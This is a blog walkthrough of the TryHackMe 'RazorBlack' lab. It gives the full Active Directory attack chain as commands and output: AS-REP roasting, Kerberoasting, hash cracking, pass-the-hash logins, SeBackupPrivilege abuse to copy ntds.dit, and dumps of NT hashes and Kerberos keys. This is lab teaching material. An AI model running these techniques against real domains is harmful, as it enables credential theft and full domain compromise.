<!doctype html><html lang=en dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe RazorBlack | Classroom</title><meta name=keywords content="tryhackme,rooms,thm,RazorBlack"><meta name=description content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??"><meta name=author content="Animesh Roy"><link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-raz0rblack/><link crossorigin=anonymous href=/assets/css/stylesheet.da3211e5ef867bf2b75fd5a6515cfed7195c011e8ab735694e203810a827097b.css integrity="sha256-2jIR5e+Ge/K3X9WmUVz+1xlcAR6KtzVpTiA4EKgnCXs=" rel="preload stylesheet" as=style><link rel=icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=16x16 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=icon type=image/png sizes=32x32 href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=apple-touch-icon href=https://classroom.anir0y.in/img/avatar.jpeg><link rel=mask-icon href=https://classroom.anir0y.in/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://classroom.anir0y.in/post/tryhackme-raz0rblack/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-raz0rblack/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="TryHackMe RazorBlack"><meta property="og:description" content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-07-18T19:31:05+05:30"><meta property="article:modified_time" content="2021-07-18T19:31:05+05:30"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Rooms"><meta property="article:tag" content="Thm"><meta property="article:tag" content="RazorBlack"><meta property="og:image" content="https://classroom.anir0y.in/img/thm.gif"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://classroom.anir0y.in/img/thm.gif"><meta name=twitter:title content="TryHackMe RazorBlack"><meta name=twitter:description content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"TryHackMe RazorBlack","item":"https://classroom.anir0y.in/post/tryhackme-raz0rblack/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe RazorBlack","name":"TryHackMe RazorBlack","description":"TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??","keywords":["tryhackme","rooms","thm","RazorBlack"],"articleBody":"Overview RazorBlack Room Task 01 These guys call themselves hackers. Can you show them who’s the boss ??\nTask 02: Flag Submission Panel What is the Domain Name? nmap\nsudo nmap -sV -sC -oN nmap/init 10.10.149.120 # Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120 Nmap scan report for 10.10.149.120 Host is up (0.15s latency). Not shown: 986 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-18 14:05:57Z) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: ...[snip]... 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 2049/tcp open mountd 1-3 (RPC #100005) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RAZ0RBLACK | NetBIOS_Domain_Name: RAZ0RBLACK | NetBIOS_Computer_Name: HAVEN-DC | DNS_Domain_Name: raz0rblack.thm | DNS_Computer_Name: HAVEN-DC.raz0rblack.thm | Product_Version: 10.0.17763 |_ System_Time: 2021-07-18T14:06:45+00:00 | ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm | Not valid before: 2021-02-22T15:02:37 |_Not valid after: 2021-08-24T15:02:37 |_ssl-date: 2021-07-18T14:06:54+00:00; +2s from scanner time. Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1s, deviation: 0s, median: 1s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-18T14:06:47 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jul 18 19:38:17 2021 -- 1 IP address (1 host up) scanned in 163.34 seconds What is Steven’s Flag? SMB\nSMBMAP\n┌──(anir0y㉿kali)-[~/share/thm/room/raz0rblack] └─$ smbmap -u '' -p '' -H 10.10.149.120 2 ⨯ [+] IP: 10.10.149.120:445 Name: 10.10.149.120 showmount\n┌──(anir0y㉿kali)-[~/share/thm/room/raz0rblack] └─$ showmount -e 10.10.149.120 Export list for 10.10.149.120: /users (everyone) showmount shows us one dir, let’s mount it to local machine and continue:\n# create a mount dir $ mkdir smb $ sudo mount -t nfs -o vers=2 10.10.149.120:/users ./smb $ sudo -i # read the files # ls -l total 2 -rwx------ 1 4294967294 4294967294 9861 Feb 25 21:54 employee_status.xlsx -rwx------ 1 4294967294 4294967294 80 Feb 26 01:01 sbradley.txt # cat sbradley.txt THM{flag-data} there is another file employee_status.xlsx let’s read the content of this file. in my case I used MS office, you can use any office application. Extracted usernames from the xlsx file:\ncontent\ndaven port imogen royce tamara vidal arthur edwards carl ingram nolan cassidy reza zaydan ljudmila vetrova rico delgado tyson williams steven bradley chamber lin create a users file based on employee list I tried with hashcat to create userlist, but turns out format is First letter of First Name + Last name: i.e. dport for daven port\n$cat user.lst dport iroyce tvidal aedwards cingram ncassidy rzaydan lvetrova rdelgado twilliams sbradley clin DNS, let’s map the domain to IP\n$ cat /etc/hosts 10.10.149.120 raz0rblack raz0rblack.thm What is the zip file’s password? ASREPRoast let’s go\n$ python3 /opt/impacket/examples/GetNPUsers.py 'raz0rblack.thm/' -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) # getting the hash $ cat hashes.asreproast $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c #bruteforce $ hashcat -m 18200 hashes.asreproast rockyou.txt(relative path is /usr/share/wordlists/rockyou.txt) # cracked hash hashcat -m 18200 hashes.asreproast --show $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c:roastpotatoes trying loggin in with new creds (SMB)\n$ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes [+] IP: MACHINE_IP:445 Name: MACHINE_IP Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share trash NO ACCESS Files Pending for deletion we can read IPC$, that means we can bruteforce ussernames:\n$ crackmapexec smb $(cat hosts) -u 'twilliams' -p 'roastpotatoes' --rid-brute [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing SSH protocol database [*] Initializing WINRM protocol database [*] Initializing SMB protocol database [*] Initializing MSSQL protocol database [*] Initializing LDAP protocol database [*] Copying default configuration file [*] Generating SSL certificate SMB 10.10.149.120 445 HAVEN-DC [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False) SMB 10.10.149.120 445 HAVEN-DC [+] raz0rblack.thm\\twilliams:roastpotatoes SMB 10.10.149.120 445 HAVEN-DC [+] Brute forcing RIDs SMB 10.10.149.120 445 HAVEN-DC 498: RAZ0RBLACK\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 500: RAZ0RBLACK\\Administrator (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 501: RAZ0RBLACK\\Guest (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 502: RAZ0RBLACK\\krbtgt (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 512: RAZ0RBLACK\\Domain Admins (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 513: RAZ0RBLACK\\Domain Users (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 514: RAZ0RBLACK\\Domain Guests (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 515: RAZ0RBLACK\\Domain Computers (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 516: RAZ0RBLACK\\Domain Controllers (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 517: RAZ0RBLACK\\Cert Publishers (SidTypeAlias) SMB 10.10.149.120 445 HAVEN-DC 518: RAZ0RBLACK\\Schema Admins (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 519: RAZ0RBLACK\\Enterprise Admins (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 520: RAZ0RBLACK\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 521: RAZ0RBLACK\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 522: RAZ0RBLACK\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 525: RAZ0RBLACK\\Protected Users (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 526: RAZ0RBLACK\\Key Admins (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 527: RAZ0RBLACK\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 553: RAZ0RBLACK\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.149.120 445 HAVEN-DC 571: RAZ0RBLACK\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.149.120 445 HAVEN-DC 572: RAZ0RBLACK\\Denied RODC Password Replication Group(SidTypeAlias) SMB 10.10.149.120 445 HAVEN-DC 1000: RAZ0RBLACK\\HAVEN-DC$ (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 1101: RAZ0RBLACK\\DnsAdmins (SidTypeAlias) SMB 10.10.149.120 445 HAVEN-DC 1102: RAZ0RBLACK\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.149.120 445 HAVEN-DC 1106: RAZ0RBLACK\\xyan1d3 (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 1107: RAZ0RBLACK\\lvetrova (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 1108: RAZ0RBLACK\\sbradley (SidTypeUser) SMB 10.10.149.120 445 HAVEN-DC 1109: RAZ0RBLACK\\twilliams (SidTypeUser) new users add them to a file\nxyan1d3 lvetrova sbradley twilliams Password:\nroastpotatoes checking for password reuse:\n$ crackmapexec smb $(cat hosts) -u user.lst -p pass.lst 130 ⨯ SMB 10.10.149.120 445 HAVEN-DC [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False) SMB 10.10.149.120 445 HAVEN-DC [-] raz0rblack.thm\\xyan1d3:roastpotatoes STATUS_LOGON_FAILURE SMB 10.10.149.120 445 HAVEN-DC [-] raz0rblack.thm\\lvetrova:roastpotatoes STATUS_LOGON_FAILURE SMB 10.10.149.120 445 HAVEN-DC [-] raz0rblack.thm\\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE let’s change the password for sbradley\n$ smbpasswd -r $(cat hosts) -U sbradley 1 ⨯ Old SMB password: `roastpotatoes` New SMB password: `Passw0rd!` Retype new SMB password: `Passw0rd!` Password changed for user sbradley #password is set to our password Enumerate SMB with new password:\nsmbmap -H MACHINE_IP -u sbradley -p 'Passw0rd!' [+] IP: MACHINE_IP:445 Name: MACHINE_IP Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share SYSVOL READ ONLY Logon server share trash READ ONLY Files Pending for deletion root@kali$ smbclient //MACHINE_IP/trash --user='sbradley%Passw0rd!' Try \"help\" to get a list of possible commands. smb: \\\u003e dir . D 0 Tue Mar 16 02:01:28 2021 .. D 0 Tue Mar 16 02:01:28 2021 chat_log_20210222143423.txt A 1340 Thu Feb 25 14:29:05 2021 experiment_gone_wrong.zip A 18927164 Tue Mar 16 02:02:20 2021 sbradley.txt A 37 Sat Feb 27 14:24:21 2021 smb: \\\u003e recurse on smb: \\\u003e prompt off smb: \\\u003e mget * [...] Cracking the zip and looking at contents:\n# convert to hash that john can crack root@kali$ zip2john experiment_gone_wrong.zip \u003e hash $ john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status electromagnetismo (experiment_gone_wrong.zip) 1g 0:00:00:00 DONE (2021-07-16 17:05) 1.408g/s 11803Kp/s 11803Kc/s 11803KC/s elephantmeee..elanore67 Use the \"--show\" option to display all of the cracked passwords reliably Session completed root@kali$ unzip experiment_gone_wrong.zip Archive: experiment_gone_wrong.zip [experiment_gone_wrong.zip] system.hive password: electromagnetismo inflating: system.hive inflating: ntds.dit What is Ljudmila’s Hash? Extract hashes\npython3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL \u003e hashes.txt We need to extract all NTHASHes\ncat hashes.txt| cut -d \":\" -f 4 \u003e pothashes.txt After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:\ncrackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt ...[snip]... SMB MACHINE_IP 445 HAVEN-DC [+] raz0rblack.thm\\lvetrova f220d3988deb3f516c73f40ee16c431d What is Ljudmila’s Flag? Login: (with hash we found earlier)\nevil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d *Evil-WinRM* PS C:\\Users\\lvetrova\\Documents\u003e whoami raz0rblack\\lvetrova *Evil-WinRM* PS C:\\Users\\lvetrova\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\lvetrova\u003e $Credential = Import-Clixml -Path \".\\lvetrova.xml\" *Evil-WinRM* PS C:\\Users\\lvetrova\u003e $Credential.GetNetworkCredential().password THM{flag-data} What is Xyan1d3’s password? Kerberoasting with pass-the-hash with lvetrovas creds:\npython3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ------------------------------------- ------- ---------------------------------------------------------- -------------------------- --------- ---------- HAVEN-DC/xyan1d3.raz0rblack.thm:60111 xyan1d3 CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm 2021-02-23 10:17:17.715160 root@kali$ hashcat -m 13100 hashes.kerberoast rockyou.txt(relative path: /usr/share/wordlist/rockyou.txt) # cracked password: cyanide9amine5628 What is Xyan1d3’s Flag? login:\n$ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628 *Evil-WinRM* PS C:\\Users\\xyan1d3\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\xyan1d3\u003e $Credential = Import-Clixml -Path \"xyan1d3.xml\" *Evil-WinRM* PS C:\\Users\\xyan1d3\u003e $Credential.GetNetworkCredential().password LOL here it is -\u003e THM{62ca7e0b901aa8f0b233cade0839b5bb} What is the root Flag? check privileges:\n*Evil-WinRM* PS C:\\Users\\xyan1d3\u003e whoami /all [...] PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled Abuse Backup Privs (important: diskshadow.txt has a space after each line):\n# create `diskshadow.txt` file content are follwoing root@kali$ cat diskshadow.txt set metadata C:\\tmp\\tmp.cabs set context persistent nowriters add volume c: alias someAlias create expose %someAlias% h: *Evil-WinRM* PS C:\\Users\\xyan1d3\u003e mkdir C:\\tmp *Evil-WinRM* PS C:\\tmp\u003e upload diskshadow.txt *Evil-WinRM* PS C:\\tmp\u003e diskshadow.exe /s c:\\tmp\\diskshadow.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: HAVEN-DC, 7/16/2021 3:45:19 PM -\u003e set metadata C:\\tmp\\tmp.cabs -\u003e set context persistent nowriters -\u003e add volume c: alias someAlias -\u003e create Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable. Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13} %someAlias% - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\\\?\\Volume{115c1f55-0000-0000-0000-602200000000}\\ [C:\\] - Creation time: 7/16/2021 3:45:20 PM - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 - Originating machine: HAVEN-DC.raz0rblack.thm - Service machine: HAVEN-DC.raz0rblack.thm - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential Number of shadow copies listed: 1 -\u003e expose %someAlias% h: -\u003e %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13} The shadow copy was successfully exposed as h:\\. ref:\nhttps://coldfusionx.github.io/posts/Blackfield-HTB/ http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738 Get dll’s to abuse Backup Privs:\nroot@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll Upload, import, abuse:\n*Evil-WinRM* PS C:\\tmp\u003e upload SeBackupPrivilegeUtils.dll *Evil-WinRM* PS C:\\tmp\u003e upload SeBackupPrivilegeCmdLets.dll *Evil-WinRM* PS C:\\tmp\u003e import-module .\\SeBackupPrivilegeUtils.dll *Evil-WinRM* PS C:\\tmp\u003e import-module .\\SeBackupPrivilegeCmdLets.dll *Evil-WinRM* PS C:\\tmp\u003e copy-filesebackupprivilege h:\\windows\\ntds\\ntds.dit C:\\tmp\\ntds.dit -overwrite *Evil-WinRM* PS C:\\tmp\u003e reg save HKLM\\SYSTEM C:\\tmp\\system *Evil-WinRM* PS C:\\tmp\u003e download ntds.dit *Evil-WinRM* PS C:\\tmp\u003e download system Dump the hashes:\nroot@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1::: raz0rblack.thm\\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025::: raz0rblack.thm\\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d::: raz0rblack.thm\\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e::: raz0rblack.thm\\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e::: [*] Kerberos keys from ntds.dit Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8 Administrator:des-cbc-md5:d3b646b65bceb5c7 HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6 HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27 HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5 krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb krbtgt:des-cbc-md5:857a46f13e91eae3 raz0rblack.thm\\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f raz0rblack.thm\\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61 raz0rblack.thm\\xyan1d3:des-cbc-md5:e9a1a46223cd8975 raz0rblack.thm\\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39 raz0rblack.thm\\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839 raz0rblack.thm\\lvetrova:des-cbc-md5:385d6e1f1cc17fb6 raz0rblack.thm\\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5 raz0rblack.thm\\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580 raz0rblack.thm\\sbradley:des-cbc-md5:83fe3e584f4a5bf8 raz0rblack.thm\\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559 raz0rblack.thm\\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a raz0rblack.thm\\twilliams:des-cbc-md5:01e958b0ea6edf07 Get admin flag:\nroot@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c *Evil-WinRM* PS C:\\users\\administrator\\Documents\u003e cd .. *Evil-WinRM* PS C:\\users\\administrator\u003e type root.xml ","wordCount":"2108","inLanguage":"en","image":"https://classroom.anir0y.in/img/thm.gif","datePublished":"2021-07-18T19:31:05+05:30","dateModified":"2021-07-18T19:31:05+05:30","author":{"@type":"Person","name":"Animesh Roy"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/tryhackme-raz0rblack/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https://classroom.anir0y.in/img/avatar.jpeg"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=https://classroom.anir0y.in/ accesskey=h title="Classroom (Alt + H)"><img src=https://classroom.anir0y.in/img/avatar.jpeg alt aria-label=logo height=35>Classroom</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://classroom.anir0y.in/post/ title=Posts><span>Posts</span></a></li><li><a href=https://classroom.anir0y.in/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://classroom.anir0y.in/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://classroom.anir0y.in/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://classroom.anir0y.in/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://classroom.anir0y.in/about/me/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://classroom.anir0y.in/>Home</a>&nbsp;»&nbsp;<a href=https://classroom.anir0y.in/post/>Posts</a></div><h1 class="post-title entry-hint-parent">TryHackMe RazorBlack</h1><div class=post-description>TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who's the boss ??</div><div class=post-meta><span title='2021-07-18 19:31:05 +0530 IST'>July 18, 2021</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>Animesh Roy</span>&nbsp;|&nbsp;<span>
